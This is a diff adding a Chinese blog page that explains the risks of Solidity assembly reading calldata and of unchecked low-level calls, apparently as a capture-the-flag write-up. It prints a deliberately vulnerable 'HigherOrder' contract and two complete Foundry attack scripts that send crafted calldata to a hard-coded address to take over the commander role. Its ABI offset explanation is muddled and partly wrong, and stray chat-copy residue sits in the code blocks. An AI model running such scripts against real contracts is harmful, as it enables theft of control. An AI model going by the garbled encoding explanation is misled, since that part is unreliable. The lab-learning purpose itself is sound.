@@ -1,0 +1,359 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>关于合约使用`assembly`操作`calldata`以及`low-level call`接受数据的弊端 | 小阿修的博客</title><meta name="author" content="zhaojx"><meta name="copyright" content="zhaojx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这是发文教程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于合约使用&#96;assembly&#96;操作&#96;calldata&#96;以及&#96;low-level call&#96;接受数据的弊端">
+<meta property="og:url" content="http://example.com/2025/01/19/%E5%85%B3%E4%BA%8E%E5%90%88%E7%BA%A6%E4%BD%BF%E7%94%A8assembly%E6%93%8D%E4%BD%9Ccalldata%E6%88%96%E8%80%85low-level%20call%E6%8E%A5%E5%8F%97%E6%95%B0%E6%8D%AE%E7%9A%84%E5%BC%8A%E7%AB%AF%EF%BC%9A/index.html">
+<meta property="og:site_name" content="小阿修的博客">
+<meta property="og:description" content="这是发文教程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2025-01-19T14:00:37.000Z">
+<meta property="article:modified_time" content="2025-07-21T12:25:14.839Z">
+<meta property="article:author" content="zhaojx">
+<meta property="article:tag" content="标签1">
+<meta property="article:tag" content="标签2">
+<meta property="article:tag" content="以此类推">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "关于合约使用`assembly`操作`calldata`以及`low-level call`接受数据的弊端",
+  "url": "http://example.com/2025/01/19/%E5%85%B3%E4%BA%8E%E5%90%88%E7%BA%A6%E4%BD%BF%E7%94%A8assembly%E6%93%8D%E4%BD%9Ccalldata%E6%88%96%E8%80%85low-level%20call%E6%8E%A5%E5%8F%97%E6%95%B0%E6%8D%AE%E7%9A%84%E5%BC%8A%E7%AB%AF%EF%BC%9A/",
+  "image": "http://example.com/img/avatar.jpg",
+  "datePublished": "2025-01-19T14:00:37.000Z",
+  "dateModified": "2025-07-21T12:25:14.839Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "zhaojx",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/%5Bobject%20Object%5D"><link rel="canonical" href="http://example.com/2025/01/19/%E5%85%B3%E4%BA%8E%E5%90%88%E7%BA%A6%E4%BD%BF%E7%94%A8assembly%E6%93%8D%E4%BD%9Ccalldata%E6%88%96%E8%80%85low-level%20call%E6%8E%A5%E5%8F%97%E6%95%B0%E6%8D%AE%E7%9A%84%E5%BC%8A%E7%AB%AF%EF%BC%9A/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '关于合约使用`assembly`操作`calldata`以及`low-level call`接受数据的弊端',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background3.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" alt="Logo"><span class="site-name">小阿修的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">关于合约使用`assembly`操作`calldata`以及`low-level call`接受数据的弊端</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">关于合约使用`assembly`操作`calldata`以及`low-level call`接受数据的弊端</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-19T14:00:37.000Z" title="发表于 2025-01-19 22:00:37">2025-01-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-21T12:25:14.839Z" title="更新于 2025-07-21 20:25:14">2025-07-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%86%E7%B1%BB1/">分类1</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%86%E7%B1%BB2/">分类2</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%86%E7%B1%BB2/%E4%BA%8C%E7%BA%A7%E5%88%86%E7%B1%BB/">二级分类</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="关于合约使用assembly操作calldata以及low-level-call接受数据的弊端："><a href="#关于合约使用assembly操作calldata以及low-level-call接受数据的弊端：" class="headerlink" title="关于合约使用assembly操作calldata以及low-level call接受数据的弊端："></a>关于合约使用<code>assembly</code>操作<code>calldata</code>以及<code>low-level call</code>接受数据的弊端：</h1><p>[TOC]</p>
+<p>大部分合约的编写完全可以通过solidity完成，但是内联汇编是Solidity的一个重要补充，它让你更深入地理解底层操作和合约优化。合约在使用 <strong><code>assembly</code> 操作 <code>calldata</code></strong> 或使用 <strong>低级调用（<code>call</code>, <code>delegatecall</code> 等）接收数据</strong> 时，确实能实现一些底层的灵活性，但也引入了一些严重的<strong>安全风险、可维护性问题和兼容性弊端</strong>。</p>
+<h2 id="assembly-操作-calldata-的弊端"><a href="#assembly-操作-calldata-的弊端" class="headerlink" title="assembly 操作 calldata 的弊端"></a><code>assembly</code> 操作 <code>calldata</code> 的弊端</h2><ol>
+<li>在 <code>assembly</code> 中直接使用 <code>calldataload</code> 加载数据时，是不做类型检查的。如果数据位置或大小不符合预期，会读取到错误的值或导致合约异常。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    let val := calldataload(4)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>msg.data</code> 长度不足，则 <code>val</code> 会是 0，或是无意义数据。</p>
+<ol start="2">
+<li><strong>容易受 ABI 编码方式影响</strong></li>
+</ol>
+<p>   <code>calldata</code> 的格式遵循 ABI 编码规范。例如 <code>uint8</code> 也会被编码成 32 字节（左填零）。开发者在 <code>assembly</code> 中操作时一旦理解有误，就容易产生错误。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function registerTreasury(uint8) public &#123;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        sstore(treasury_slot, calldataload(4))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	本意是接收 <code>uint8</code> 参数并写入 <code>treasury</code>。但由于 <code>calldataload(4)</code> 直接读取 32 字节，而不是仅取 <code>uint8</code>，攻击者可通过构造 <code>calldata</code>（例如 <code>uint256</code> 超过 255）来绕过检查逻辑并修改重要状态。虽然函数参数是 <code>uint8</code>，但通过 <code>calldata</code> 注入可以写入超过 <code>uint8</code> 范围的数据（例如 <code>0xff</code> → <code>255</code>、甚至更高）。</p>
+<h2 id="低级-call-的弊端"><a href="#低级-call-的弊端" class="headerlink" title="低级 call 的弊端"></a>低级 <code>call</code> 的弊端</h2><ol>
+<li>低级 <code>call</code> 返回的是 <code>(bool success, bytes memory returnData)</code>，不会像普通函数调用一样在失败时自动 <code>revert</code>。开发者若未手动检查 <code>success</code>，将继续执行，这可能导致状态被错误修改。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(bool success, ) = address(target).call(data);</span><br><span class="line">// 若未判断 success，会忽略失败继续执行</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>参数位置和格式必须精确匹配 ABI</li>
+</ol>
+<p>   使用 <code>call</code> 时传入的 <code>data</code> 必须完全符合目标函数的 ABI，否则调用可能失败或执行逻辑被绕过。例如，如果你将 <code>uint8</code> 的函数用 <code>uint256</code> 编码，就可能被攻击利用。</p>
+<p><code>call</code> 的基本语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(bool success, bytes memory data) = address(target).call&#123;value: amount, gas: gasLimit&#125;(payload);</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>address(target)</code></td>
+<td>要调用的合约地址</td>
+</tr>
+<tr>
+<td><code>.call&#123;value: ..., gas: ...&#125;</code></td>
+<td>（可选）发送 ETH、限制 gas</td>
+</tr>
+<tr>
+<td><code>(payload)</code></td>
+<td>传入的 ABI 编码数据（通常用 <code>abi.encodeWithSelector</code> 构造）</td>
+</tr>
+<tr>
+<td><code>success</code></td>
+<td>调用是否成功</td>
+</tr>
+<tr>
+<td><code>data</code></td>
+<td>返回的原始数据（类型为 <code>bytes memory</code>）</td>
+</tr>
+</tbody></table>
+<p><code>abi.encodeWithSignature(...)</code> 返回的是一个 <strong><code>bytes</code> 类型的动态数组</strong>，它本质上就是一个 <strong><code>byte</code> 数组</strong>，即 <code>bytes memory</code>，你当然可以通过索引（<code>data[i]</code>）访问和修改它的每一个字节。这会生成一个完整的 calldata：</p>
+<ul>
+<li>前 4 字节：函数选择器（<code>registerTreasury()</code> 的 keccak256 hash 前四位）</li>
+<li>后 32 字节：参数部分，但 ABI 会扩展成一个完整的 <code>uint256</code> 占满 32 字节（高位为 0）</li>
+</ul>
+<p>所以总共 4 + 32 &#x3D; 36 字节的数组。你能通过索引 <code>data[0] ... data[35]</code> 访问和修改任何一位。</p>
+<p>在 Solidity 的 <strong>ABI 编码规则</strong>中，<strong>可变长度类型（如 <code>bytes</code>, <code>string</code>, <code>arrays</code>）在函数调用中会被按”offset + length + data”</strong> 结构编码，函数前四个字节是 selector，后面每个参数占 32 字节，偏移量就是指向该参数数据起始位置的 <strong>相对位置（从整个 calldata 开头算起）</strong>。</p>
+<hr>
+<h3 id="✅-以-function-flipSwitch-bytes-memory-data-为例："><a href="#✅-以-function-flipSwitch-bytes-memory-data-为例：" class="headerlink" title="✅ 以 function flipSwitch(bytes memory _data) 为例："></a>✅ 以 <code>function flipSwitch(bytes memory _data)</code> 为例：</h3><p>这函数有一个 <code>bytes</code> 类型参数，<code>flipSwitch(bytes)</code> 的 ABI 编码如下结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python复制编辑| 0x00 - 0x03 | 4 bytes: 函数选择器 selector（flipSwitch(bytes)） |</span><br><span class="line">| 0x04 - 0x23 | 32 bytes: 第一个参数 `_data` 的偏移量 offset (通常是 0x20 or 0x60) |</span><br><span class="line">| 0x24 - ...  | 如果有多个参数，这里放第二个参数的 offset 或值 |</span><br><span class="line">| offset      | 从偏移位置开始：_data 的长度 (32 bytes) |</span><br><span class="line">| offset+32   | 实际的数据（按 32 字节对齐） |</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="👇-为什么是-0x60？"><a href="#👇-为什么是-0x60？" class="headerlink" title="👇 为什么是 0x60？"></a>👇 为什么是 <code>0x60</code>？</h3><p>这是因为在 ABI 编码中：</p>
+<ul>
+<li>前 <strong>4 bytes</strong> 是函数 selector：<code>30c13ade</code></li>
+<li>后面每个参数都占用 <strong>32 bytes</strong></li>
+<li>可变长度参数不在参数位置放值，而是放个偏移（指向 data 起始位置）</li>
+</ul>
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python复制编辑offset = 4 bytes selector</span><br><span class="line">       + 32 bytes offset 指针（指向 bytes 的位置）</span><br><span class="line">       = 0x04 + 0x20 = 0x24（但向上对齐成 32 的倍数）</span><br><span class="line">       → ABI 对齐要求偏移必须是 32 的倍数，所以下一个就是 0x60</span><br></pre></td></tr></table></figure>
+
+<p>但实际上更常见的是：</p>
+<ul>
+<li>如果你只有一个参数（bytes 类型），偏移就是 **<code>0x20</code>**；</li>
+<li>你看到的是 <code>0x60</code>，说明还有别的数据（如构造时的数据前缀或 padding），或者是你手动构造时加了偏移。</li>
+</ul>
+<hr>
+<h3 id="✅-举个具体例子"><a href="#✅-举个具体例子" class="headerlink" title="✅ 举个具体例子"></a>✅ 举个具体例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">solidity复制编辑contract Target &#123;</span><br><span class="line">    function flipSwitch(bytes memory data) public &#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>你调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">solidity</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">target.flipSwitch(abi.encodeWithSignature(&quot;turnSwitchOn()&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>会生成这样的 calldata：</p>
+<table>
+<thead>
+<tr>
+<th>偏移（bytes）</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x00 - 0x03</td>
+<td><code>flipSwitch(bytes)</code> 的 selector，例如 <code>0x30c13ade</code></td>
+</tr>
+<tr>
+<td>0x04 - 0x23</td>
+<td><code>0x20</code> （bytes 参数的偏移量，从0x20开始）</td>
+</tr>
+<tr>
+<td>0x24 - 0x43</td>
+<td><code>0x04</code> （bytes 长度）</td>
+</tr>
+<tr>
+<td>0x44 - 0x47</td>
+<td><code>0x76227e12</code> （turnSwitchOn() 的 selector）</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="🧠-如果是-0x60-偏移"><a href="#🧠-如果是-0x60-偏移" class="headerlink" title="🧠 如果是 0x60 偏移"></a>🧠 如果是 <code>0x60</code> 偏移</h3><p>说明在你构造的 calldata 中，前面可能还插入了额外字段（比如模拟多个参数的布局），或者用了底层工具手动构造了复杂的数据布局。</p>
+<hr>
+<h3 id="✅-总结"><a href="#✅-总结" class="headerlink" title="✅ 总结"></a>✅ 总结</h3><ul>
+<li>Solidity 函数参数按 ABI 编码规范进行组织；</li>
+<li>对于 <code>bytes</code> 类型这样的动态参数，不直接放内容，而是放“偏移地址”；</li>
+<li>偏移地址是从 calldata 开头起算的；</li>
+<li>一般只有一个动态参数时，偏移是 <code>0x20</code>；</li>
+<li>出现 <code>0x60</code> 说明你传入的 calldata 中存在更多结构，比如多参数或 padding。</li>
+</ul>
+<h3 id="比较memory和calldata"><a href="#比较memory和calldata" class="headerlink" title="比较memory和calldata"></a>比较memory和calldata</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Compare &#123;</span><br><span class="line">    // calldata：更省 gas</span><br><span class="line">    function cal(uint[] calldata arr) external pure returns (uint) &#123;</span><br><span class="line">        return arr[0]; // ✅ 可读取</span><br><span class="line">        // arr[0] = 1; // ❌ 报错，不能修改</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // memory：可修改，但更贵</span><br><span class="line">    function mem(uint[] memory arr) public pure returns (uint) &#123;</span><br><span class="line">        arr[0] = 123; // ✅ 可写</span><br><span class="line">        return arr[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.6.12;</span><br><span class="line"></span><br><span class="line">contract HigherOrder &#123;</span><br><span class="line">    address public commander;</span><br><span class="line"></span><br><span class="line">    uint256 public treasury;</span><br><span class="line"></span><br><span class="line">    function registerTreasury(uint8) public &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(treasury_slot, calldataload(4))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimLeadership() public &#123;</span><br><span class="line">        if (treasury &gt; 255) commander = msg.sender;</span><br><span class="line">        else revert(&quot;Only members of the Higher Order can become Commander&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.6.12;</span><br><span class="line"></span><br><span class="line">import &#123;Script&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &#123;HigherOrder&#125; from &quot;../src/contract.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack1 is Script &#123;</span><br><span class="line">    function run() external &#123;</span><br><span class="line">        HigherOrder higherOrder = HigherOrder(</span><br><span class="line">            0x45B37F77FFF0153afF1e723a5EdB38157d1fd713</span><br><span class="line">        );</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        address(higherOrder).call(</span><br><span class="line">            abi.encodeWithSignature(&quot;registerTreasury(uint8)&quot;, 256)</span><br><span class="line">        );</span><br><span class="line">        address(higherOrder).call(abi.encodeWithSignature(&quot;claimLeadership()&quot;));</span><br><span class="line">        require(address(higherOrder.commander()) == msg.sender, &quot;hack failed&quot;);</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;//正常构造大于 uint8 范围的 calldata 因为calldata是32字节的，不受函数参数类型大小的影响。</span><br><span class="line"></span><br><span class="line">contract Attack2 is Script &#123;</span><br><span class="line">    function run() external &#123;</span><br><span class="line">        HigherOrder higherOrder = HigherOrder(</span><br><span class="line">            0x45B37F77FFF0153afF1e723a5EdB38157d1fd713</span><br><span class="line">        );</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        bytes memory data = abi.encodeWithSignature(</span><br><span class="line">            &quot;registerTreasury(uint8)&quot;,</span><br><span class="line">            uint8(6)</span><br><span class="line">        );</span><br><span class="line">        data[21] = hex&quot;FF&quot;;</span><br><span class="line">        address(higherOrder).call(data);</span><br><span class="line">        address(higherOrder).call(abi.encodeWithSignature(&quot;claimLeadership()&quot;));</span><br><span class="line">        require(address(higherOrder.commander()) == msg.sender, &quot;hack failed&quot;);</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;//正常构造小于 uint8 范围的 calldata，再篡改calldata的字节</span><br><span class="line">//两种解题思路，第一种比较直接。但是第二种值得学习一下。</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">zhaojx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/01/19/%E5%85%B3%E4%BA%8E%E5%90%88%E7%BA%A6%E4%BD%BF%E7%94%A8assembly%E6%93%8D%E4%BD%9Ccalldata%E6%88%96%E8%80%85low-level%20call%E6%8E%A5%E5%8F%97%E6%95%B0%E6%8D%AE%E7%9A%84%E5%BC%8A%E7%AB%AF%EF%BC%9A/">http://example.com/2025/01/19/%E5%85%B3%E4%BA%8E%E5%90%88%E7%BA%A6%E4%BD%BF%E7%94%A8assembly%E6%93%8D%E4%BD%9Ccalldata%E6%88%96%E8%80%85low-level%20call%E6%8E%A5%E5%8F%97%E6%95%B0%E6%8D%AE%E7%9A%84%E5%BC%8A%E7%AB%AF%EF%BC%9A/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">小阿修的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A0%87%E7%AD%BE1/">标签1</a><a class="post-meta__tags" href="/tags/%E6%A0%87%E7%AD%BE2/">标签2</a><a class="post-meta__tags" href="/tags/%E4%BB%A5%E6%AD%A4%E7%B1%BB%E6%8E%A8/">以此类推</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/01/19/vnctfwp/" title="心想事成"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">心想事成</div></div><div class="info-2"><div 